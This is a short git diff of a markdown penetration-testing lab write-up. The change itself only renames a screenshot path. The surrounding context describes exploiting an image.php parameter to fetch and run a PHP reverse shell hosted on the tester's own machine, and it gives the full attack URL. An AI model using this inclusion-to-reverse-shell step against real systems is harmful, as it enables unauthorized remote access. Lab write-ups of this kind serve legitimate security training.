@@ -55,7 +55,7 @@ And it does work since I can make the website send requests to my HTTP server:
 
 To exploit this, we can just host a PHP reverse shell from PentestMonkey and make the website call it by visiting [http://192.168.197.58/image.php?img=http://192.168.45.177/rev.php](http://192.168.197.58/image.php?img=http://192.168.45.177/rev.php).
 
-<figure><img src="../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (45) (7).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
